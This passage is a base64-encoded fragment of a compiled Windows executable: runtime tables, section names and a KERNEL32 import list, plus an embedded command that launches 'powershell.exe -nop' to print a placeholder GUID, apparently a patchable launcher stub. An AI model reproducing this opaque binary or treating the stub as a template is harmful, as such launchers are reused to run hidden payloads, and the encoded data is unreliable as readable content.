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AAAAAAA5QBDcmVhdGVQcm9jZXNzVwAAS0VSTkVMMzIuZGxsAADTBFJ0bENhcHR1cmVDb250ZXh0ANoEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAA4QRSdGxWaXJ0dWFsVW53aW5kAAC8BVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAewVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAHQJHZXRDdXJyZW50UHJvY2VzcwCaBVRlcm1pbmF0ZVByb2Nlc3MAAIkDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABQBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAB4CR2V0Q3VycmVudFByb2Nlc3NJZAAiAkdldEN1cnJlbnRUaHJlYWRJZAAA8AJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBsA0luaXRpYWxpemVTTGlzdEhlYWQAggNJc0RlYnVnZ2VyUHJlc2VudADXAkdldFN0YXJ0dXBJbmZvVwB+AkdldE1vZHVsZUhhbmRsZVcAAOAEUnRsVW53aW5kRXgAZwJHZXRMYXN0RXJyb3IAAD8FU2V0TGFzdEVycm9yAAA1AUVudGVyQ3JpdGljYWxTZWN0aW9uAADAA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAARAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgBoA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQArAVUbHNBbGxvYwAArgVUbHNHZXRWYWx1ZQCvBVRsc1NldFZhbHVlAK0FVGxzRnJlZQCxAUZyZWVMaWJyYXJ5ALUCR2V0UHJvY0FkZHJlc3MAAMYDTG9hZExpYnJhcnlFeFcAAGYEUmFpc2VFeGNlcHRpb24AANkCR2V0U3RkSGFuZGxlAAAhBldyaXRlRmlsZQB6AkdldE1vZHVsZUZpbGVOYW1lVwAAZAFFeGl0UHJvY2VzcwB9AkdldE1vZHVsZUhhbmRsZUV4VwAA3AFHZXRDb21tYW5kTGluZUEA3QFHZXRDb21tYW5kTGluZVcATgNIZWFwQWxsb2MAUgNIZWFwRnJlZQAAewFGaW5kQ2xvc2UAgQFGaW5kRmlyc3RGaWxlRXhXAACSAUZpbmROZXh0RmlsZVcAjgNJc1ZhbGlkQ29kZVBhZ2UAuAFHZXRBQ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UABAAAAAAAAAAAAAAAAAAAAAAAAAODvAEABAAAAYPEAQAEAAADg5QBAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIBmAUABAAAAQGEBQAEAAABDAAAAAAAAAIhoAUABAAAAEHwBQAEAAAAQfAFAAQAAABB8AUABAAAAEHwBQAEAAAAQfAFAAQAAABB8AUABAAAAEHwBQAEAAAAQfAFAAQAAABB8AUABAAAAf39/f39/f3+MaAFAAQAAABR8AUABAAAAFHwBQAEAAAAUfAFAAQAAABR8AUABAAAAFHwBQAEAAAAUfAFAAQAAABR8AUABAAAALgAAAC4AAAD+////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIkAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQICAgICAgICAgICAgICAgIDAwMDAwMDAwAAAAAAAAAA/v////////8AAAAAAAAAAAEAAAB1mAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA